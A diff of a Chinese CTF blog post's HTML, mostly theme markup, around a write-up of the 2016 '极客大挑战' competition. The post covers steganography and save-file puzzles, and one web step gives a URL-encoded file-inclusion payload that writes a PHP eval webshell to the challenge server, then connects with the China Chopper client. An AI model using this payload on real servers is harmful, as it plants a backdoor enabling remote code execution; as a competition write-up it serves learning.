@@ -1,115 +1,285 @@
-<!DOCTYPE html>
-<html>
-  <!-- Html Head Tag-->
-  <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="">
-  <meta name="author" content="zion">
-  <!-- Open Graph Data -->
-  <meta property="og:title" content="极客大挑战 write up"/>
-  <meta property="og:description" content="" />
-  <meta property="og:site_name" content="Dream-n"/>
-  <meta property="og:type" content="article" />
-  <meta property="og:image" content="http://yoursite.comundefined"/>
-  
-    <link rel="alternate" href="/atom.xml" title="Dream-n" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
+<!doctype html>
+
+
+
   
 
-  <!-- Site Title -->
-  <title>Dream-n</title>
 
-  <!-- Bootstrap CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.min.css">
-  <!-- Custom CSS -->
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
   
-  <link rel="stylesheet" href="/css/style.light.css">
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
-  <!-- Google Analytics -->
+
+
+
+  
+  
+  
   
 
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="misc闪得好快链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。
+come_game是一个小游戏，在打开游戏之后会出现deathtime，save2这两个文件，玩了几关之后会发现小人死了几次，deathtime中的二进制数据就会有所改变。并且改变save2中第02位的数据，将32改成33时，游戏进入下一关，改成35时flag就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="极客大挑战 write up">
+<meta property="og:url" content="http://yoursite.com/2016/10/23/极客大挑战 write up/index.html">
+<meta property="og:site_name" content="Dream-n">
+<meta property="og:description" content="misc闪得好快链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。
+come_game是一个小游戏，在打开游戏之后会出现deathtime，save2这两个文件，玩了几关之后会发现小人死了几次，deathtime中的二进制数据就会有所改变。并且改变save2中第02位的数据，将32改成33时，游戏进入下一关，改成35时flag就">
+<meta property="og:updated_time" content="2016-10-23T10:06:19.009Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="极客大挑战 write up">
+<meta name="twitter:description" content="misc闪得好快链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。
+come_game是一个小游戏，在打开游戏之后会出现deathtime，save2这两个文件，玩了几关之后会发现小人死了几次，deathtime中的二进制数据就会有所改变。并且改变save2中第02位的数据，将32改成33时，游戏进入下一关，改成35时flag就">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"hide"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/10/23/极客大挑战 write up/"/>
+
+  <title> 极客大挑战 write up | Dream-n </title>
 </head>
 
-  <body>
-    <!-- Page Header -->
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
 
 
-<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <div class="page-title with-background-image">
-          <p class="title">极客大挑战 write up</p>
-          <p class="subtitle"></p>
-        </div>
-        <div class="site-menu with-background-image">
-          <ul>
-            
-              <li>
-                <a href="/">
-                  
-                  Home
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="/archives">
-                  
-                  Archives
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="https://github.com/levblanc">
-                  
-                  Github
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="mailto:levblanc@163.com">
-                  
-                  Email
-                  
-                </a>
-              </li>
-            
-          </ul>
-        </div>
-      </div>
-    </div>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Dream-n</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
   </div>
-</header>
+  <p class="site-subtitle">月落乌啼霜满天</p>
+</div>
 
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
 
-<article>
-  <div class="container typo">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <div class="post-info text-muted">
-          
-            <!-- Author -->
-            <span class="author info">By zion</span>
-          
-          <!-- Date -->
-          <span class="date-time info">On
-            <span class="date">2016-10-23</span>
-            <span class="time">17:12:45</span>
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                极客大挑战 write up
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-10-23T18:06:19+08:00" content="2016-10-23">
+              2016-10-23
+            </time>
           </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
           
         </div>
-        <!-- Tags -->
-        
-        <!-- Post Main Content -->
-        <div class="post-content">
-          <h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="闪得好快"><a href="#闪得好快" class="headerlink" title="闪得好快"></a>闪得好快</h4><p>链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。</p>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="闪得好快"><a href="#闪得好快" class="headerlink" title="闪得好快"></a>闪得好快</h4><p>链接打开是一个下载的链接，下载解压之后是一个gif图，把gif图给分解掉，分成一帧一帧的，用手机扫下二维码就出来答案啦。</p>
 <h4 id="come-game"><a href="#come-game" class="headerlink" title="come_game"></a>come_game</h4><p>是一个小游戏，在打开游戏之后会出现deathtime，save2这两个文件，玩了几关之后会发现小人死了几次，deathtime中的二进制数据就会有所改变。并且改变save2中第02位的数据，将32改成33时，游戏进入下一关，改成35时flag就出来了。</p>
 <h4 id="snow"><a href="#snow" class="headerlink" title="snow"></a>snow</h4><p>snow这道题提示是HTML隐写，搜了一下是一种叫snow的隐写术，找到了一个解密的网站<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="external">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a>，把网址和key输进去，flag就出来了。</p>
 <h4 id="旋转跳跃"><a href="#旋转跳跃" class="headerlink" title="旋转跳跃"></a>旋转跳跃</h4><p>下载下来是一个MP3文件，MP3文件也是可以隐藏文件的，用MP3stego将文件导出来就行了。<br>这个工具一定要放在桌面上才能正常运行。使用方式如下：<a href="http://blog.csdn.net/myloveprogrmming/article/details/52641916" target="_blank" rel="external">http://blog.csdn.net/myloveprogrmming/article/details/52641916</a></p>
@@ -144,42 +314,272 @@
 <p>编码之后是这个样子的：<br><a href="http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path%3D%3C%3Fphp%2520eval%28%24_post%5B%27123%27%5D%29%3F%3E&amp;path=1.php" target="_blank" rel="external">http://game.sycsec.com:50084/?file=http://127.0.0.1/?file=http://127.0.0.1/%26path%3D%3C%3Fphp%2520eval%28%24_post%5B%27123%27%5D%29%3F%3E&amp;path=1.php</a></p>
 <p>之后再用菜刀连接就可以得到flag。</p>
 
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/21/sql注入/" rel="next" title="sql注入">
+                <i class="fa fa-chevron-left"></i> sql注入
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
         </div>
-      </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
     </div>
   </div>
-</article>
 
 
+          </div>
+          
 
-    <!-- Footer -->
-<footer>
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <p class="copyright text-muted">
-          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
-          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
-        <p class="copyright text-muted">
-          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
-        </p>
-      </div>
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
   </div>
-</footer>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/av.jpeg"
+               alt="zion" />
+          <p class="site-author-name" itemprop="name">zion</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">Artikel</span>
+            </a>
+          </div>
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#misc"><span class="nav-number">1.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#闪得好快"><span class="nav-number">1.1.</span> <span class="nav-text">闪得好快</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#come-game"><span class="nav-number">1.2.</span> <span class="nav-text">come_game</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#snow"><span class="nav-number">1.3.</span> <span class="nav-text">snow</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#旋转跳跃"><span class="nav-number">1.4.</span> <span class="nav-text">旋转跳跃</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#凯撒部长的奖励"><span class="nav-number">1.5.</span> <span class="nav-text">凯撒部长的奖励</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MD5cracker"><span class="nav-number">1.6.</span> <span class="nav-text">MD5cracker</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PEN-AND-APPLE"><span class="nav-number">1.7.</span> <span class="nav-text">PEN_AND_APPLE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#藏着小秘密的流量包"><span class="nav-number">1.8.</span> <span class="nav-text">藏着小秘密的流量包</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web"><span class="nav-number">2.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web-1"><span class="nav-number">2.1.</span> <span class="nav-text">web_1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web-2"><span class="nav-number">2.2.</span> <span class="nav-text">web_2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqli2"><span class="nav-number">2.3.</span> <span class="nav-text">sqli2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#127-0-0-x"><span class="nav-number">2.4.</span> <span class="nav-text">127.0.0.x</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-is-fun"><span class="nav-number">2.5.</span> <span class="nav-text">php_is_fun()</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
 
 
-    <!-- After Footer Scripts -->
-<script src="/js/highlight.pack.js"></script>
-<script>
-  document.addEventListener("DOMContentLoaded", function(event) {
-    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
-    codeBlocks.forEach(function(block, index) {
-      hljs.highlightBlock(block);
-    });
-  });
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zion</span>
+</div>
+
+<div class="powered-by">
+  Erstellt mit  <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
 </script>
 
-  </body>
-</html>
 
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
